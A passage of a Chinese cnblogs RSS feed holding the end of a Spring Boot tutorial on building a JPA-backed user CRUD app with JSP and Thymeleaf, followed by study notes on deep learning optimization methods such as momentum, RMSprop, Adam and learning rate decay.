&lt;p&gt;首先是实体类，这里因为用了JPA，所以和之前的有点不同，添加了一些注解。&lt;br/&gt;&lt;strong&gt;Entity&lt;/strong&gt;：表示这是个实体类。&lt;br/&gt;&lt;strong&gt;Table&lt;/strong&gt;：该实体类映射的数据表名。&lt;br/&gt;&lt;strong&gt;Column&lt;/strong&gt;：指定该字段的属性，nullable 表示是否非空，unique 表示是否是唯一。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;那么实体类的代码如下:&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;@Entity
@Table(name = &quot;t_user&quot;)
public class User {
    
     /** 编号 */
     @Id
     @GeneratedValue
     private Long id;
     /** 姓名 */
     @Column(nullable = false, unique = true)
     private String name;
     /** 密码*/
     @Column(nullable = false)
     private String password;
     /** 年龄 */
     @Column(nullable = false)
     private Integer age;
    
    //getter和setter略
}    
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;由于用的是JPA，dao层这块只需继承&lt;strong&gt;JpaRepository&lt;/strong&gt;该类即可，需要指定实体类和主键类型。&lt;br/&gt;&lt;strong&gt;dao层代码如下:&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;@Mapper
public interface UserDao extends JpaRepository&amp;lt;User, Long&amp;gt;{
    
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;业务层这块和之前一样调用即可，虽然用的是JPA，但是方法也是很简单的，新增和修改就用save，删除就是delete，findOne就是通过ID查找，findAll就是查询所有等等。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;services代码如下:&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;@Service
public class UserServiceImpl implements UserService {

    @Autowired
    private UserDao userDao;
    
    
    @Override
    public boolean addUser(User user) {
        boolean flag=false;
        try{
            userDao.save(user);
            flag=true;
        }catch(Exception e){
            System.out.println(&quot;新增失败!&quot;);
            e.printStackTrace();
        }
        return flag;
    }

    @Override
    public boolean updateUser(User user) {
        boolean flag=false;
        try{
            userDao.save(user);
            flag=true;
        }catch(Exception e){
            System.out.println(&quot;修改失败!&quot;);
            e.printStackTrace();
        }
        return flag;
    }

    @Override
    public boolean deleteUser(Long id) {
        boolean flag=false;
        try{
            userDao.delete(id);
            flag=true;
        }catch(Exception e){
            System.out.println(&quot;删除失败!&quot;);
            e.printStackTrace();
        }
        return flag;
    }

    @Override
    public User findUserById(Long id) {
        return userDao.findOne(id);
    }

    @Override
    public List&amp;lt;User&amp;gt; findAll() {
        return userDao.findAll();
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;到了控制层这块，这里提供还是提供接口给Jsp进行调用，不过这里类的注解就不能用之前的&lt;strong&gt;RestController&lt;/strong&gt;这个注解，这个注解以json的格式返回数据，但是我们有时返回的时候需要跳转界面，所以应该使用&lt;strong&gt;Controller&lt;/strong&gt;这个注解。如果想在某个方法中返回的数据格式是json的话，在该方法上加上&lt;strong&gt;ResponseBody&lt;/strong&gt;这个注解即可。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;控制层代码如下:&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;@Controller
public class UserRestController {
        @Autowired
        private UserService userService;
 
        @RequestMapping(&quot;/hello&quot;)
        public String hello() {
            return &quot;hello&quot;;
        }
        
        @RequestMapping(&quot;/&quot;)
        public String index() {
            return &quot;redirect:/list&quot;;
        }
        
        
        @RequestMapping(&quot;/list&quot;)
        public String list(Model model) {
            System.out.println(&quot;查询所有&quot;);
            List&amp;lt;User&amp;gt; users=userService.findAll();
            model.addAttribute(&quot;users&quot;, users);
            return &quot;user/list&quot;;
        }

        @RequestMapping(&quot;/toAdd&quot;)
        public String toAdd() {
            return &quot;user/userAdd&quot;;
        }

        @RequestMapping(&quot;/add&quot;)
        public String add(User user) {
            userService.addUser(user);
            return &quot;redirect:/list&quot;;
        }

        @RequestMapping(&quot;/toEdit&quot;)
        public String toEdit(Model model,Long id) {
            User user=userService.findUserById(id);
            model.addAttribute(&quot;user&quot;, user);
            return &quot;user/userEdit&quot;;
        }

        @RequestMapping(&quot;/edit&quot;)
        public String edit(User user) {
            userService.updateUser(user);
            return &quot;redirect:/list&quot;;
        }


        @RequestMapping(&quot;/toDelete&quot;)
        public String delete(Long id) {
            userService.deleteUser(id);
            return &quot;redirect:/list&quot;;
        }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;功能测试&quot;&gt;功能测试&lt;/h3&gt;
&lt;p&gt;后端代码介绍就到这里了，至于前端JSP的代码就不在多说了(主要原因是界面写得太丑了...），我们直接启动项目，查看效果。&lt;br/&gt;启动项目，在浏览器上输入:http://localhost:8088/list&lt;br/&gt;&lt;strong&gt;主界面:&lt;/strong&gt;&lt;br/&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1138196/201807/1138196-20180711225513478-1329303285.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;添加一条数据之后的界面:&lt;br/&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1138196/201807/1138196-20180711225522467-183980528.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1138196/201807/1138196-20180711225532130-1865100828.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;其它的修改和删除也能实现，这里就在一一不贴图了。&lt;br/&gt;springBoot整合 Jsp到这就结束了。&lt;/p&gt;
&lt;h2 id=&quot;sringboot整合thymeleaf&quot;&gt;SringBoot整合Thymeleaf&lt;/h2&gt;
&lt;p&gt;该工程参考:http://www.ityouknow.com/springboot/2017/09/23/spring-boot-jpa-thymeleaf-curd.html&lt;/p&gt;
&lt;h3 id=&quot;thymeleaf介绍&quot;&gt;Thymeleaf介绍&lt;/h3&gt;
&lt;p&gt;Thymeleaf是个模板引擎，可以用于Web与非Web应用，它可以XML/XHTML/HTML5， JavaScript, CSS ,甚至文本文件。&lt;/p&gt;
&lt;h3 id=&quot;thymeleaf的使用&quot;&gt;Thymeleaf的使用&lt;/h3&gt;
&lt;p&gt;Thymeleaf这块个人使用不太熟练，这个也不是本篇文章主要讲述的内容，详细的可以查看官方文档。&lt;br/&gt;https://www.thymeleaf.org/documentation.html&lt;/p&gt;
&lt;h3 id=&quot;开发准备-1&quot;&gt;开发准备&lt;/h3&gt;
&lt;p&gt;基本和上面的SringBoot整合Jsp差不多，这里就不再赘述了。&lt;/p&gt;
&lt;p&gt;由于SpringBoot默认的模版引擎就是Thymeleaf，所以Maven 依赖这块只需要在原先的springBoot项目添加Thymeleaf的依赖就行。&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;  &amp;lt;dependency&amp;gt;
            &amp;lt;groupId&amp;gt;org.springframework.boot&amp;lt;/groupId&amp;gt;
            &amp;lt;artifactId&amp;gt;spring-boot-starter-thymeleaf&amp;lt;/artifactId&amp;gt;
 &amp;lt;/dependency&amp;gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;application.properties&lt;/strong&gt; 配置这块，可以和之前的项目基本一致，需要注意的也只有&lt;strong&gt;spring.thymeleaf.cache&lt;/strong&gt;配置，为false的时候是关闭Thymeleaf的缓存，更改界面之后会自动重启然后生效。&lt;/p&gt;
&lt;p&gt;SringBoot整合Thymeleaf和SringBoot整合Jsp有个比较大的不同是，Thymeleaf的资源文件是放在&lt;strong&gt;src/main/resources&lt;/strong&gt;目录下，Jsp的是放在&lt;strong&gt;src/main/webapp&lt;/strong&gt;目录下。其中resources目录下的的static目录用于放置静态内容，比如css、js、jpg图片等。templates目录用于放置项目使用的页面模板，也就是&lt;strong&gt;.html&lt;/strong&gt;文件。&lt;/p&gt;
&lt;p&gt;它的项目结构图如下:&lt;br/&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1138196/201807/1138196-20180711225543996-552976954.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;代码基本和SringBoot整合Jsp一致，这里就不在赘述了。&lt;/p&gt;
&lt;h3 id=&quot;功能测试-1&quot;&gt;功能测试&lt;/h3&gt;
&lt;p&gt;启动该项目，在浏览器输入:http://localhost:8085&lt;br/&gt;&lt;strong&gt;主界面:&lt;/strong&gt;&lt;br/&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1138196/201807/1138196-20180711225556431-1572869591.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;修改用户数据之后的:&lt;br/&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1138196/201807/1138196-20180711225603895-1306357319.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1138196/201807/1138196-20180711225614933-1916568608.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;其它的功能也是可以实现的，这里就不再过多贴图了。&lt;br/&gt;springBoot整合 Thymeleaf到这就结束了。&lt;/p&gt;
&lt;h2 id=&quot;其它&quot;&gt;其它&lt;/h2&gt;
&lt;p&gt;关于SpringBoot整合Jsp和Thymeleaf 到这里就结束了。&lt;br/&gt;SpringBoot整合Jsp的项目工程地址:&lt;br/&gt;https://github.com/xuwujing/springBoot-study/tree/master/springboot-jsp-jpa&lt;br/&gt;SpringBoot整合Thymeleaf的项目工程地址:&lt;br/&gt;https://github.com/xuwujing/springBoot-study/tree/master/springboot-thymeleaf&lt;/p&gt;
&lt;p&gt;原创不易，如果感觉不错，希望给个推荐！您的支持是我写作的最大动力！&lt;br/&gt;版权声明:&lt;br/&gt;作者：虚无境&lt;br/&gt;博客园出处：http://www.cnblogs.com/xuwujing&lt;br/&gt;CSDN出处：http://blog.csdn.net/qazwsxpcm　　　　&lt;br/&gt;个人博客出处：http://www.panchengming.com&lt;/p&gt;
</description>
<pubDate>Wed, 11 Jul 2018 14:57:00 +0000</pubDate>
<dc:creator>虚无境</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/xuwujing/p/9297165.html</dc:identifier>
</item>
<item>
<title>吴恩达《深度学习》第二门课（2）优化算法 - ysyouaremyall</title>
<link>http://www.cnblogs.com/ys99/p/9297067.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/ys99/p/9297067.html</guid>
<description>&lt;h2&gt;2.1Mini-batch梯度下降&lt;/h2&gt;
&lt;p&gt;（1）例如有500万个训练样本，这时可以每1000个组成一个Mini-batch,共用5000个Mini-batch。主要是为了加快训练。&lt;/p&gt;
&lt;p&gt;（2）循环完所有的训练样本称为（1 epoch）。&lt;/p&gt;
&lt;p&gt;（3）使用大括号X&lt;sup&gt;{t}&lt;/sup&gt;,Y&lt;sup&gt;{t}&lt;/sup&gt;表示一个Mini-batch。（小括号（i）表示第i个样本，中括号[l]表示神经网络第l层）。&lt;/p&gt;
&lt;h2&gt;2.2理解mini-batch梯度下降法&lt;/h2&gt;
&lt;p&gt;（1）batch梯度下降时，每一次迭代代价函数都会降低（如果某一次不是，说明出问题了，可能要改变学习率），而mini-batch梯度下降时，不一定每次都降低，但是总的趋势是下降的。如下图所示：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1326691/201807/1326691-20180711203004770-1829252624.png&quot; alt=&quot;&quot; width=&quot;587&quot; height=&quot;241&quot;/&gt;&lt;/p&gt;
&lt;p&gt;（2）Mini-batch的大小设为m（总样本数）时，变成了batch梯度下降（训练慢当样本总数大时），当设为1，变成了随机梯度下降（这时没能很好利用多样本的向量化的优势，也会导致变慢）。所示实际中选择不大不小的mini-batch尺寸，下降速度达到最快。&lt;/p&gt;
&lt;p&gt;（3）不管是随机梯度下降还是mini-batch梯度下降都不会达到收敛，如下图所示紫色线条，所以后期需要减小学习率来使其趋向收敛。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1326691/201807/1326691-20180711203516411-104614410.png&quot; alt=&quot;&quot; width=&quot;319&quot; height=&quot;237&quot;/&gt;&lt;/p&gt;
&lt;p&gt;（4）当样本数小于2000时可直接使用batch梯度下降，当样本数很大时，一般把mini-batch的大小设为2的n次方，比如64,126,512等，这样是考虑到电脑内存设置和使用方法。&lt;/p&gt;
&lt;p&gt;（5）同第四点，所以在调参mini-batch的大小时常常设置2的不同次方。&lt;/p&gt;
&lt;h2&gt; 2.3指数加权平均数&lt;/h2&gt;
&lt;p&gt;（1）下图中蓝色为每天的的温度，红色是温度的指数加权平均数，使用如下公式计算而来：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1326691/201807/1326691-20180711204900463-774984647.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1326691/201807/1326691-20180711204910134-721174334.png&quot; alt=&quot;&quot; width=&quot;393&quot; height=&quot;199&quot;/&gt;&lt;/p&gt;
&lt;p&gt;（2）将上式更一般的表示如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1326691/201807/1326691-20180711204948761-527943651.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;β越大，反应越快，波动性却强，如下图中黄色线；β越小，延迟多大，越平缓，如下图中绿色线。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1326691/201807/1326691-20180711205109375-503787188.png&quot; alt=&quot;&quot; width=&quot;403&quot; height=&quot;200&quot;/&gt;&lt;/p&gt;
&lt;p&gt;（3）在计算时，可以认为v&lt;sub&gt;t&lt;/sub&gt;是&lt;img src=&quot;https://images2018.cnblogs.com/blog/1326691/201807/1326691-20180711205249487-1136607734.png&quot; alt=&quot;&quot;/&gt;天的平均温度，如β等于0.5时，看成是两天的平均温度，β=0.98，则是50天的平均温度。&lt;/p&gt;
&lt;h2&gt;2.4理解指数加权平均数&lt;/h2&gt;
&lt;p&gt;（1）根据下面式子：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1326691/201807/1326691-20180711210411523-919732484.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;进行展开：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1326691/201807/1326691-20180711210432744-2089297592.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;所以V&lt;sub&gt;100&lt;/sub&gt;其实是下面两个图对应点乘积的求和（右图是从0.1开始往左指数下降）：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1326691/201807/1326691-20180711210529991-1713834698.png&quot; alt=&quot;&quot;/&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1326691/201807/1326691-20180711210537106-574746963.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;（2）当β为0.9时，下降到第十天（0.9）&lt;sup&gt;10&lt;/sup&gt;约等于0.35，大约是1/e,认为降到这个数之后可以忽略不计了。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1326691/201807/1326691-20180711211006213-293477478.png&quot; alt=&quot;&quot; width=&quot;337&quot; height=&quot;220&quot;/&gt;&lt;/p&gt;
&lt;p&gt;（3）指数加权平均数公式的好处之一就在于，他占用极少内存，电脑内存中占用一行数字而已，然后把最新的数据代入公式，不断覆盖就可以了。&lt;/p&gt;
&lt;h2&gt;2.5指数加权平均数的偏差修正&lt;/h2&gt;
&lt;p&gt; （1）按照前面提到的公式计算，比如β为0.9，得不到下图中绿色的线，而是得到紫色的线，因为一开始已经没有之前的数据可以加了，导致小了很多。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1326691/201807/1326691-20180711211837636-955677975.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1326691/201807/1326691-20180711211912838-643508970.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;（2）解决方法是引入偏差修正，即按照之前的公式算出v&lt;sub&gt;t&lt;/sub&gt;之后，再除以（1-β&lt;sup&gt;t&lt;/sup&gt;）,如下所示：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1326691/201807/1326691-20180711212106111-522566837.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;当t=2时：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1326691/201807/1326691-20180711212141262-395322072.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt; &lt;img src=&quot;https://images2018.cnblogs.com/blog/1326691/201807/1326691-20180711212206394-1387058323.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;这样将能能到绿色的线，当t很大时，分母也趋向于1，那时将不起作用（也不需要起作用）。&lt;/p&gt;
&lt;h2&gt;2.6动量梯度下降法（Momentum）&lt;/h2&gt;
&lt;p&gt;（1）下图中蓝色是梯度下降的过程：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1326691/201807/1326691-20180711213410009-774793630.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;（2）我们希望沿着垂直方向的振幅能变小，因为是无效的，同时因为振幅的存在使得学习率不能太大，太大振幅会更大，甚至训练的越来越差；同时横轴方向希望学习率能增大，更加快速的到达最优点，以上矛盾的两者，可以通过上一节讲到的指数加权平均来解决（因为垂直方向的均值为0，通过加权平均之后将会减小或者消除振幅，横轴方向因为始终吵着一个方向，所以进行指数加权平均没多大影响），公式如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1326691/201807/1326691-20180711213838421-1483050795.png&quot; alt=&quot;&quot; width=&quot;478&quot; height=&quot;350&quot;/&gt;&lt;/p&gt;
&lt;p&gt;（3）是否进行偏差修正影响不大，β取0.9是一个比较好的参数，学习率α会随之β的修改做一定的修改。&lt;/p&gt;
&lt;h2&gt;2.7RMSprop&lt;/h2&gt;
&lt;p&gt;（1）下图中，沿着b振幅大，说明db比较大：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1326691/201807/1326691-20180711215525741-1473146944.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;（2）使用如下式子进行参数更新，理解：前两个式子平方之后将不会出现Momentum中权值平均后变为0的情况，哪边振幅大对应计算结果大，所以S&lt;sub&gt;dw&lt;/sub&gt;较小，S&lt;sub&gt;db&lt;/sub&gt;较大；然后dw除以一个较小的数也就相当于取了较大的学习率，db除了一个较大的数，也就相当于取了一个较小的学习率，这就是RMSprop：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1326691/201807/1326691-20180711215558965-72273621.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1326691/201807/1326691-20180711215618395-1856121286.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1326691/201807/1326691-20180711215628250-1947790896.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;（3）最终会按照绿色的线优化：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1326691/201807/1326691-20180711220051681-674268979.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;h2&gt;2.8Adam 优化算法&lt;/h2&gt;
&lt;p&gt;（1）按照下列式子顺序即可得到Adam,他完美的讲上面提到的两种算法结合在了一起，需要注意一点是，Adam需要参数修正：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1326691/201807/1326691-20180711220917988-282291974.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1326691/201807/1326691-20180711220927816-14550475.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1326691/201807/1326691-20180711220943920-1751526049.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1326691/201807/1326691-20180711220953902-628757263.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1326691/201807/1326691-20180711221005820-2029168084.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1326691/201807/1326691-20180711221016690-323140363.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1326691/201807/1326691-20180711221030329-1167951743.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1326691/201807/1326691-20180711221038951-1410079772.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1326691/201807/1326691-20180711221050996-314386693.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1326691/201807/1326691-20180711221100572-246955546.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;（2）参数涉及学习率α，β1（Momentum），β2（RMSprop）,ε（RMSprop）,其中学习率需要调整，其他三个参数使用下面图中的默认值就很好。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1326691/201807/1326691-20180711221338473-557597944.png&quot; alt=&quot;&quot; width=&quot;358&quot; height=&quot;238&quot;/&gt;&lt;/p&gt;
&lt;h2&gt;2.9学习率衰减（Learning rate decay）&lt;/h2&gt;
&lt;p&gt;（1）以下公式是一个学习率衰减的式子，其中包含了初始学习率a&lt;sub&gt;0&lt;/sub&gt;好衰减率（decay-rate）两个参数需要调整：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1326691/201807/1326691-20180711222237532-2092085660.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;（2）其他降低学习率的式子：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1326691/201807/1326691-20180711222311732-1222962150.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1326691/201807/1326691-20180711222344682-1122588302.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1326691/201807/1326691-20180711222356729-1895698808.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;（3）还有离散的学习率，过一会变成原来的一半，还有不少人直接手动调整。&lt;/p&gt;
&lt;h2&gt;2.10局部最优的问题&lt;/h2&gt;
&lt;p&gt;（1）在低维（如二维）可能陷入局部最优，如下图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1326691/201807/1326691-20180711223123091-2068671655.png&quot; alt=&quot;&quot; width=&quot;204&quot; height=&quot;192&quot;/&gt;&lt;/p&gt;
&lt;p&gt;（2）但是在高维中，比如20000维，陷入局部最优的概率是2&lt;sup&gt;-20000&lt;/sup&gt;（即每一维度都梯度为零，几乎不可能），所以更多的时候是出现处在鞍点上：如下图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1326691/201807/1326691-20180711223401892-972083532.png&quot; alt=&quot;&quot; width=&quot;264&quot; height=&quot;235&quot;/&gt;&lt;/p&gt;
&lt;p&gt;（3）存在的问题是：在平稳端学习缓慢，上面提到的算法如Adam,能够更快的走出平稳区。&lt;/p&gt;
</description>
<pubDate>Wed, 11 Jul 2018 14:37:00 +0000</pubDate>
<dc:creator>ysyouaremyall</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/ys99/p/9297067.html</dc:identifier>
</item>
</channel>
</rss>